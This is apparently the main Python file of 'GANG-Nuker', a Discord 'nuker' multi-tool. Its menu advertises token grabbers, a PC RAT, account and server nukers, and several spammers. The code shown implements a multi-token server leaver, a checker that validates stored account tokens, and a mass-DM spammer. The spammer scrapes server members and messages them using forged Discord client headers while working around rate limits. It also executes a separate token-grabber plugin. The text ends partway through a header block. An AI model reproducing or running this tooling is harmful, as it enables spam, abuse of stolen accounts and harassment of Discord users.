# Coded / Dev: ††#9999 or ††#1158 | https://github.com/TT-Tutorials | https://github.com/TT-Tutorials/GANG-Nuker
# GANG Discord Nuker / Multi Tool©
# Copyright © 2022 ††#9999 / ††#1158
# Copyright © GANG-Nuker
#########################################################

from utilities.Settings.common import *
from utilities.Settings.update import search_for_updates
import utilities.Plugins.Auto_Login
import utilities.Plugins.DM_Deleter
import utilities.Plugins.Token_Info
import utilities.Plugins.QR_Grabber
import utilities.Plugins.Account_Nuker

if __name__ == "__main__":
    import sys
    if os.path.basename(sys.argv[0]).endswith("exe"):
        with open(getTempDir()+"\\gang_proxies", 'w'): pass
        clear()
        proxy_scrape()
        sleep(1)
    try:
        assert sys.version_info >= (3,8)
    except AssertionError:
        print(f"{Fore.RED}Your Python Version is Not supported: ({sys.version_info[0]}.{sys.version_info[1]}.{sys.version_info[2]}), Please Download v3.9+ to use GANG-Nuker!")
        sleep(5)
        print("Exiting...")
        sleep(1.5)
        os._exit(0)
    else:
        with open(getTempDir()+"\\gang_proxies", 'w'): pass
        clear()
        proxy_scrape()
        sleep(1.5)
    finally:
        Fore.RESET

#########################################################

def Spinner():
	l = ['|', '/', '-', '\\', ' ']
	for i in l+l+l:
		sys.stdout.write(f"""\r {i}""")
		sys.stdout.flush()
		time.sleep(0.1)

global cls
def cls():
 os.system('cls' if os.name=='nt' else 'clear')
def tool():
  os.system('cls' if os.name=='nt' else 'clear')

def clearConsole(): return os.system(
    'cls' if os.name in ('nt', 'dos') else 'clear')

global useragent
def useragent():
    file = open('utilities/QR/useragent.txt','r')
    useragent = (random.choice(list(file)))
    useragent2 = []
    useragent2.append(useragent)
    useragent1 = []

#########################################################

import os
import time
import emoji
import shutil
import zipfile
import datetime
import colorama
import requests
import easygui, os
import random, string
from time import sleep
from json import loads
from time import sleep
from json import dumps
import base64, pyperclip
from typing import Union
import webbrowser, base64
from colorama import Fore
import requests, threading
from tasksio import TaskPool
from tqdm import tqdm, trange
from websocket import WebSocket
from colorama import Back, Fore, Style
from concurrent.futures import ThreadPoolExecutor
from discord import Webhook, RequestsWebhookAdapter

import os
from os import system

try:
    import requests
except:
    os.system("pip install requests")
    import requests
try:
    from requests import get
except:
    os.system("pip install requests")
    from requests import get

import threading

try:
    import colorama
except:
    os.system("pip install colorama")
    import colorama

try:
    import discord
except:
    os.system("pip install discord")
    import discord

from discord.ext import commands

try:
    import pyautogui
except:
    os.system("pip install pyautogui")
    import pyautogui

import time
import re

try:
    import http.client
except:
    os.system('pip install python-http-client')
    import http.client

import random

try:
    import json
except:
    os.system('pip install json')
    import json


try:
    import base64
except:
    os.system('pip install base64')
    import base64

import string
import sys
from colorama import Fore

try:
    import emoji as ej
except:
    os.system('pip install emoji')
    import emoji as ej

try:
    import websocket
except:
    os.system('pip install websocket')
    import websocket

try:
    import asyncio
except:
    os.system('pip install asyncio')
    import asyncio

try:
    from bs4 import BeautifulSoup
except:
    os.system('pip install beautifulsoup4')

try:
    from webdriver_manager.chrome import ChromeDriverManager
except:
    os.system('pip install webdriver-manager')
    from webdriver_manager.chrome import ChromeDriverManager

try:
    from PIL import Image
except:
    os.system('pip install pillow')
    from PIL import Image

try:
    import discum
except:
    os.system('pip install discum')
    import discum

try:
    from selenium import webdriver
except:
    os.system('pip install selenium')
    from selenium import webdriver

lock = threading.Lock()
os.system('mode 120,30')
threads = 3

ur = 'https://discord.com/api/v9/channels/messages'
tokens = open('tokens.txt', 'r').read().splitlines()

def randstr(lenn):
    alpha = "abcdefghijklmnopqrstuvwxyz0123456789"
    text = ''
    for i in range(0, lenn):
        text += alpha[random.randint(0, len(alpha) - 1)]

    return text

def mainHeader(token):
    return {
        "authorization": token,
        "accept": "*/*",
        'accept-encoding': 'gzip, deflate, br',
        "accept-language": "en-GB",
        "content-length": "90",
        "content-type": "application/json",
        "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
        "origin": "https://discord.com",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9003 Chrome/91.0.4472.164 Electron/13.4.0 Safari/537.36",
        "x-debug-options": "bugReporterEnabled",
        "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAzIiwib3NfdmVyc2lvbiI6IjEwLjAuMjI0NjMiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6InNrIiwiY2xpZW50X2J1aWxkX251bWJlciI6OTkwMTYsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"
    }

def secondHeader(token):
    return {
        ':authority': 'discord.com',
        ':method': 'PATCH',
        ':path': '/api/v9/users/@me',
        ':scheme': 'https',
        'accept': '*/*',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'en-US',
        'authorization': token,
        'content-length': '124',
        'content-type': 'application/json',
        'Cookie': f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
        'origin': 'https://canary.discord.com',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.616 Chrome/91.0.4472.164 Electron/13.4.0 Safari/537.36',
        'x-debug-options': 'bugReporterEnabled',
        'x-super-properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MTYiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjQ1OCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5ODgyMywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0='}

def spammer():
    global threads
    asc = asyncio.get_event_loop()
    tokens = open('tokens.txt', 'r').read().splitlines()
    counttokens = len(open('tokens.txt').readlines())
    clear = lambda: os.system('cls')
    clear()

    colorama.init()
    print('')
    print('')
    Write.Print("                                      /$$$$$$   /$$$$$$  /$$   /$$  /$$$$$$\n", Colors.purple_to_blue, interval=0.000)
    Write.Print("                                     /$$__  $$ /$$__  $$| $$$ | $$ /$$__  $$\n", Colors.purple_to_blue, interval=0.000)
    Write.Print("                                    | $$  \__/| $$  \ $$| $$$$| $$| $$  \__/\n", Colors.purple_to_blue, interval=0.000)
    Write.Print("                                    | $$ /$$$$| $$$$$$$$| $$ $$ $$| $$ /$$$$\n", Colors.purple_to_blue, interval=0.000)
    Write.Print("                                    | $$|_  $$| $$__  $$| $$  $$$$| $$|_  $$\n", Colors.purple_to_blue, interval=0.000)
    Write.Print("                                    | $$  \ $$| $$  | $$| $$\  $$$| $$  \ $$\n", Colors.purple_to_blue, interval=0.000)
    Write.Print(f' > v{THIS_VERSION}                           |  $$$$$$/| $$  | $$| $$ \  $$|  $$$$$$/\n', Colors.purple_to_blue, interval=0.000)
    Write.Print(" > Github.com/TT-Tutorials           \______/ |__/  |__/|__/  \__/ \______/ \n", Colors.purple_to_blue, interval=0.000)
    Write.Print("════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════", Colors.purple_to_blue, interval=0.000)
    print(f'''{Fore.LIGHTMAGENTA_EX}'''.replace('$', f'{Fore.LIGHTMAGENTA_EX}${Fore.WHITE}') + f'''
{Fore.LIGHTMAGENTA_EX}[{Fore.WHITE}1{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Server Joiner   {Fore.BLACK}|{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[{Fore.WHITE}9{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET}  Channel Spammer   {Fore.BLACK}|{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[{Fore.WHITE}17{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} PC Rat{Fore.RESET}              {Fore.BLACK}|{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[{Fore.WHITE}25{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Token Generator{Fore.RESET}
{Fore.LIGHTMAGENTA_EX}[{Fore.WHITE}2{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Server Leaver   {Fore.BLACK}|{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[{Fore.WHITE}10{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} DM Spammer        {Fore.BLACK}|{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[{Fore.WHITE}18{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} About/Activity{Fore.RESET}      {Fore.BLACK}|{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[{Fore.WHITE}26{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Nitro Generator{Fore.RESET}
{Fore.LIGHTMAGENTA_EX}[{Fore.WHITE}3{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Token Checker   {Fore.BLACK}|{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[{Fore.WHITE}11{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Friend Spammer    {Fore.BLACK}|{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[{Fore.WHITE}19{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Server Lookup{Fore.RESET}       {Fore.BLACK}|{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[{Fore.WHITE}27{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} QR Token Grabber{Fore.RESET}
{Fore.LIGHTMAGENTA_EX}[{Fore.WHITE}4{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Token Onliner   {Fore.BLACK}|{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[{Fore.WHITE}12{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} HypeSquad Joiner  {Fore.BLACK}|{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[{Fore.WHITE}20{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Token Infomation{Fore.RESET}    {Fore.BLACK}|{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[{Fore.WHITE}28{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Member ID Scraper{Fore.RESET}
{Fore.LIGHTMAGENTA_EX}[{Fore.WHITE}5{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Token Grabber   {Fore.BLACK}|{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[{Fore.WHITE}13{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Reaction Spammer  {Fore.BLACK}|{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[{Fore.WHITE}21{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Status Changer{Fore.RESET}      {Fore.BLACK}|{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[{Fore.WHITE}29{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} PFP Changer{Fore.RESET}
{Fore.LIGHTMAGENTA_EX}[{Fore.WHITE}6{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Server MassDM   {Fore.BLACK}|{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[{Fore.WHITE}14{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} NickName Changer  {Fore.BLACK}|{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[{Fore.WHITE}22{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Group Spammer{Fore.RESET}       {Fore.BLACK}|{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[{Fore.WHITE}30{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} About{Fore.RESET}
{Fore.LIGHTMAGENTA_EX}[{Fore.WHITE}7{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Account Nuker   {Fore.BLACK}|{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[{Fore.WHITE}15{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Webhook Spammer   {Fore.BLACK}|{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[{Fore.WHITE}23{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Auto Login{Fore.RESET}          {Fore.BLACK}|{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[{Fore.WHITE}31{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET}{Fore.LIGHTRED_EX} THREADS{Fore.RESET}
{Fore.LIGHTMAGENTA_EX}[{Fore.WHITE}8{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Server Nuker    {Fore.BLACK}|{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[{Fore.WHITE}16{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} VC Spammer        {Fore.BLACK}|{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[{Fore.WHITE}24{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} DM Deleter{Fore.RESET}          {Fore.BLACK}|{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[{Fore.WHITE}32{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET}{Fore.LIGHTRED_EX} EXIT{Fore.RESET}''')
    Write.Print("════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════", Colors.purple_to_blue, interval=0.000)
    choice = input('\x1B[1m$: >>\x1B[1m ')



#   JOINER
    if choice == '1':
        Spinner()
        gh = input(f"""
Joiner is in the Paid Version of GANG-Nuker!\nIf You Are Wanting to Purchase Make Sure to Checkout the Offical GANG-Nuker Website!
                                   
[\x1b[95m1\x1b[95m\x1B[37m] GANG-Nuker Website
[\x1b[95m2\x1b[95m\x1B[37m] Exit
  
[\x1b[95m>\x1b[95m\x1B[37m] Choice?: """)

        if gh in ['01','1']:
            webbrowser.open('https://gangnuker.com')
        elif gh in ['02','2']:
            exit = spammer()
        else:
         print('')


#   LEAVER
    if choice == '2':
        Spinner()
        token = open("tokens.txt", "r").read().splitlines()

        ID = input(f'\n[\x1b[95m>\x1b[95m\x1B[37m] Server ID: ')

        apilink = "https://discord.com/api/v9/users/@me/guilds/" + str(ID)

        with open('tokens.txt', 'r') as handle:
            tokens = handle.readlines()
            for i in tokens:
                token = i.rstrip()
                headers = {
                    'Authorization': token,
                    "content-length": "0",
                    "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
                    "origin": "https://discord.com",
                    "sec-fetch-dest": "empty",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-site": "same-origin",
                    "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.600 Chrome/91.0.4472.106 Electron/13.1.4 Safari/537.36",
                    "x-context-properties": "eyJsb2NhdGlvbiI6Ikludml0ZSBCdXR0b24gRW1iZWQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6Ijg3OTc4MjM4MDAxMTk0NjAyNCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI4ODExMDg4MDc5NjE0MTk3OTYiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjAsImxvY2F0aW9uX21lc3NhZ2VfaWQiOiI4ODExOTkzOTI5MTExNTkzNTcifQ==",
                    "x-debug-options": "bugReporterEnabled",
                    "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MDAiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjAwMCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5NTM1MywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="

                }
                requests.delete(apilink, headers=headers)
            print(f'[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] Done')

        time.sleep(1)
        exit = input(f'\n[\x1b[95m>\x1b[95m\x1B[37m] Press ENTER: ')
        exit = clear()
        exit = spammer()



#   TOKEN CHECKER
    if choice == '3':
            Spinner()  
            print(f'\n[\x1b[95m>\x1b[95m\x1B[37m] Loading Tokens:\n')
            time.sleep(0.5)
            def success(text): lock.acquire(); print(f"[{Fore.GREEN}>{Fore.RESET}] {Fore.GREEN}Valid {Fore.RESET}{text}{Fore.RESET}"); lock.release()
            def invalid(text): lock.acquire(); print(f"[{Fore.RED}>{Fore.RESET}] {Fore.RED}Invalid {Fore.RED} {text}{Fore.RESET}"); lock.release()

            with open("tokens.txt", "r") as f: tokens = f.read().splitlines()
            def save_tokens():
                with open("tokens.txt", "w") as f: f.write("")
                for token in tokens:
                    with open("tokens.txt", "a") as f: f.write(token + "\n")
            def removeDuplicates(file):
                lines_seen = set()
                with open(file, "r+") as f:
                    d = f.readlines(); f.seek(0)
                    for i in d:
                        if i not in lines_seen: f.write(i); lines_seen.add(i)
                    f.truncate()
            def check_token(token:str):
                response = requests.get('https://discord.com/api/v9/users/@me/library', headers={"accept": "*/*","accept-encoding": "gzip, deflate, br","accept-language": "en-US,en;q=0.9","authorization": token,"cookie": "__dcfduid=88221810e37411ecb92c839028f4e498; __sdcfduid=88221811e37411ecb92c839028f4e498dc108345b16a69b7966e1b3d33d2182268b3ffd2ef5dfb497aef45ea330267cf; locale=en-US; OptanonConsent=isIABGlobal=false&datestamp=Fri+Jun+03+2022+15%3A36%3A59+GMT-0400+(Eastern+Daylight+Time)&version=6.33.0&hosts=&landingPath=https%3A%2F%2Fdiscord.com%2F&groups=C0001%3A1%2CC0002%3A1%2CC0003%3A1; __stripe_mid=3a915c95-4cf7-4d27-9d85-cfea03f7ce829a88e5; __stripe_sid=b699111a-a911-402d-a08a-c8801eb0f2e8baf912; __cf_bm=nEUsFi1av6PiX4cHH1PEcKFKot6_MslL4UbUxraeXb4-1654285264-0-AU8vy1OnS/uTMTGu2TbqIGYWUreX3IAEpMo++NJZgaaFRNAikwxeV/gxPixQ/DWlUyXaSpKSNP6XweSVG5Mzhn/QPdHU3EmR/pQ5K42/mYQaiRRl6osEVJWMMtli3L5iIA==","referer": "https://discord.com/channels/967617613960187974/981260247807168532","sec-fetch-dest": "empty","sec-fetch-mode": "cors","sec-fetch-site": "same-origin","sec-gpc": "1","user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.61 Safari/537.36","x-discord-locale": "en-US","x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEwMi4wLjUwMDUuNjEgU2FmYXJpLzUzNy4zNiIsImJyb3dzZXJfdmVyc2lvbiI6IjEwMi4wLjUwMDUuNjEiLCJvc192ZXJzaW9uIjoiMTAiLCJyZWZlcnJlciI6IiIsInJlZmVycmluZ19kb21haW4iOiIiLCJyZWZlcnJlcl9jdXJyZW50IjoiIiwicmVmZXJyaW5nX2RvbWFpbl9jdXJyZW50IjoiIiwicmVsZWFzZV9jaGFubmVsIjoic3RhYmxlIiwiY2xpZW50X2J1aWxkX251bWJlciI6MTMwNDEwLCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ=="}, timeout=5)
                if response.status_code == 200: success(f"| {token}")
                else: tokens.remove(token); invalid(f"| {token}")
            def check_tokens():
                threads=[]
                for token in tokens:
                    try:threads.append(threading.Thread(target=check_token, args=(token,)))
                    except Exception as e: pass
                for thread in threads: thread.start()
                for thread in threads: thread.join()
        

    

            def start():
                removeDuplicates("tokens.txt")
                check_tokens()
                save_tokens()

            start()
            print(f'\n\n[\x1b[95m>\x1b[95m\x1B[37m] All Tokens have been Checked! (tokens.txt has been updated with only vaild tokens!)')
            time.sleep(1)
            exit = input('[\x1b[95m>\x1b[95m\x1B[37m] Press ENTER: ')
            exit = clear()
            exit = spammer()



#   TOKEN ONLINER
    if choice == '4':
        Spinner()
        gh = input(f"""
Token Onliner is in the Paid Version of GANG-Nuker!\nIf You Are Wanting to Purchase Make Sure to Checkout the Offical GANG-Nuker Website!
            
[\x1b[95m1\x1b[95m\x1B[37m] GANG-Nuker Website
[\x1b[95m2\x1b[95m\x1B[37m] Exit
  
[\x1b[95m>\x1b[95m\x1B[37m] Choice?: """)

        if gh in ['01','1']:
            webbrowser.open('https://gangnuker.com')
        elif gh in ['02','2']:
            exit = spammer()
        else:
         print('')



#   TOKEN GRABBER
    if choice == '5':
        Spinner()
        exec(open('utilities/Plugins/Token_Grabber.py').read())



#   SERVER MASSDM
    if choice == '6':
        Spinner()
        print(
            f'{Fore.WHITE}[{Fore.RESET}{Fore.LIGHTRED_EX}!{Fore.RESET}{Fore.WHITE}]{Fore.RESET} {Fore.LIGHTRED_EX}Warning{Fore.RESET} Make Sure You Account is fully Verified Before Using this Command!')
        time.sleep(2)
        print(f'\n[\x1b[95m1\x1b[95m\x1B[37m] Multiple Tokens')
        print(f'[\x1b[95m2\x1b[95m\x1B[37m] One Account Token')
        choic = input('\n[\x1b[95m>\x1b[95m\x1B[37m] Choice?: ')

        server = input(f'[\x1b[95m>\x1b[95m\x1B[37m] Server ID: ')
        channel = input(f'[\x1b[95m>\x1b[95m\x1B[37m] Channel ID: ')

        if choic == '1':
            with open("tokens.txt") as f:
                firstline = f.readline().rstrip()
            bot = discum.Client(token=firstline)

            def close_after_fetching(resp, guild_id):
                if bot.gateway.finishedMemberFetching(guild_id):
                    lenmembersfetched = len(bot.gateway.session.guild(guild_id).members)
                    print(str(lenmembersfetched) + ' members fetched')
                    bot.gateway.removeCommand(
                        {'function': close_after_fetching, 'params': {'guild_id': guild_id}})
                    bot.gateway.close()

            def get_members(guild_id, channel_id):
                bot.gateway.fetchMembers(guild_id, channel_id, keep='all', wait=1)
                bot.gateway.command(
                    {'function': close_after_fetching, 'params': {'guild_id': guild_id}})
                bot.gateway.run()
                bot.gateway.resetSession()
                return bot.gateway.session.guild(guild_id).members

            members = get_members(server, channel)
            memberslist = []

            for memberID in members:
                memberslist.append(memberID)
                print(memberID)

            f = open('utilities/QR/massdm_IDs.txt', "w")
            for element in memberslist:
                f.write(f'{element}' + '\n')
            f.close()

            print(f'[{Fore.LIGHTMAGENTA_EX}>{Fore.RESET}] Scraping Members!')
            time.sleep(2)

            file = open("utilities/QR/massdm_IDs.txt", "r")
            Counter = 0

            Content = file.read()
            CoList = Content.split("\n")

            for i in CoList:
                if i:
                    Counter += 1

            file2 = open("tokens.txt", "r")
            Counter2 = 0

            Content2 = file2.read()
            CoList2 = Content2.split("\n")

            for i in CoList2:
                if i:
                    Counter2 += 1

            time.sleep(2)

            print(f'{Counter} Members Where Scraped!')

            amountt = int(input('[\x1b[95m>\x1b[95m\x1B[37m] How Many Members Would You Like To DM?: '))
            realamountt = int(amountt / Counter2)

            tokens = open("tokens.txt", "r").read().splitlines()
            message = input('[\x1b[95m>\x1b[95m\x1B[37m] Message?: ')

            def dmserver_spam():
                opened_dms = 0
                try:
                    for token in tokens:
                        for i in range(realamountt):
                            with open("utilities/QR/massdm_IDs.txt", "r") as file:
                                allText = file.read()
                                words = list(map(str, allText.split()))
                                idd = random.choice(words)

                            header = mainHeader(token)
                            header2 = {
                            'authority': 'discord.com',
                            'method': 'POST',
                            'path': '/api/v9/users/@me/channels',
                            'scheme': 'https',
                            "authorization": token,
                            "accept": "*/*",
                            "accept-language": "en-GB",
                            "content-length": "90",
                            "content-type": "application/json",
                            "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
                            "origin": "https://discord.com",
                            'referer': 'https://discord.com/channels/@me',
                            'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"',
                            'sec-ch-ua-mobile': '?0',
                            'sec-ch-ua-platform': "Windows",
                            "sec-fetch-dest": "empty",
                            "sec-fetch-mode": "cors",
                            "sec-fetch-site": "same-origin",
                            "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9003 Chrome/91.0.4472.164 Electron/13.4.0 Safari/537.36",
                            'x-context-properties': 'e30=',
                            "x-debug-options": "bugReporterEnabled",
                            "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAzIiwib3NfdmVyc2lvbiI6IjEwLjAuMjI0NjMiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6InNrIiwiY2xpZW50X2J1aWxkX251bWJlciI6OTkwMTYsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"
                        }

                            payload = {'recipient_id': idd}
                            r1 = requests.post(f'https://discord.com/api/v9/users/@me/channels', headers=header2,
                                               json=payload)

                            payload = {"content": message, "tts": False}
                            j = json.loads(r1.content)

                            r2 = requests.post(f"https://discord.com/api/v9/channels/{j['id']}/messages",
                                               headers=header, json=payload)

                            if r2.status_code == 429:
                                ratelimit = json.loads(r2.content)
                                print(f"[{Fore.LIGHTRED_EX}!{Fore.RESET}] Ratelimit for",
                                      str(float(ratelimit['retry_after'])) + " seconds")
                                time.sleep(float(ratelimit['retry_after']))

                            if r1.status_code == 429:
                                ratelimit = json.loads(r1.content)
                                print(f"[{Fore.LIGHTRED_EX}!{Fore.RESET}] Ratelimit for",
                                      str(float(ratelimit['retry_after'])) + " seconds")
                                time.sleep(float(ratelimit['retry_after']))

                            elif r2.status_code == 200:
                                print(f"[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] DM Sent to: {idd}!")

                            opened_dms += 1

                except:
                    print(f'[{Fore.LIGHTRED_EX}>{Fore.RESET}] Token Got Locked')

            dmserver_spam()


        elif choic == '2':
            tokens = input('[\x1b[95m>\x1b[95m\x1B[37m] Account Token?: ')
            messaage = input('[\x1b[95m>\x1b[95m\x1B[37m] Message?: ')

            bot = discum.Client(token=tokens)

            def close_after_fetching(resp, guild_id):
                if bot.gateway.finishedMemberFetching(guild_id):
                    lenmembersfetched = len(bot.gateway.session.guild(guild_id).members)
                    print(str(lenmembersfetched) + ' members fetched')
                    bot.gateway.removeCommand(
                        {'function': close_after_fetching, 'params': {'guild_id': guild_id}})
                    bot.gateway.close()

            def get_members(guild_id, channel_id):
                bot.gateway.fetchMembers(guild_id, channel_id, keep='all', wait=1)
                bot.gateway.command(
                    {'function': close_after_fetching, 'params': {'guild_id': guild_id}})
                bot.gateway.run()
                bot.gateway.resetSession()
                return bot.gateway.session.guild(guild_id).members

            members = get_members(server, channel)
            memberslist = []

            for memberID in members:
                memberslist.append(memberID)
                print(memberID)

            f = open('utilities/QR/massdm_IDs.txt', "w")
            for element in memberslist:
                f.write(f'{element}' + '\n')
            f.close()

            file = open("utilities/QR/massdm_IDs.txt", "r")
            Counter = 0

            Content = file.read()
            CoList = Content.split("\n")

            for i in CoList:
                if i:
                    Counter += 1

            time.sleep(2)

            print(f'[\x1b[95m>\x1b[95m\x1B[37m] There Are {Counter} Members!')
            amountt = int(input('[\x1b[95m>\x1b[95m\x1B[37m] How Many Members Would You Like To DM?: '))

            def dmspamre():
                try:
                    for i in range(amountt):
                        with open("utilities/QR/massdm_IDs.txt", "r") as file:
                            allText = file.read()
                            words = list(map(str, allText.split()))
                            idd = random.choice(words)

                        header = mainHeader(tokens)

                        headers = {
                            'authority': 'discord.com',
                            'method': 'POST',
                            'path': '/api/v9/users/@me/channels',
                            'scheme': 'https',
                            "authorization": tokens,
                            "accept": "*/*",
                            "accept-language": "en-GB",
                            "content-length": "90",
                            "content-type": "application/json",
                            "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
                            "origin": "https://discord.com",
                            'referer': 'https://discord.com/channels/@me',
                            'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"',
                            'sec-ch-ua-mobile': '?0',
                            'sec-ch-ua-platform': "Windows",
                            "sec-fetch-dest": "empty",
                            "sec-fetch-mode": "cors",
                            "sec-fetch-site": "same-origin",
                            "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9003 Chrome/91.0.4472.164 Electron/13.4.0 Safari/537.36",
                            'x-context-properties': 'e30=',
                            "x-debug-options": "bugReporterEnabled",
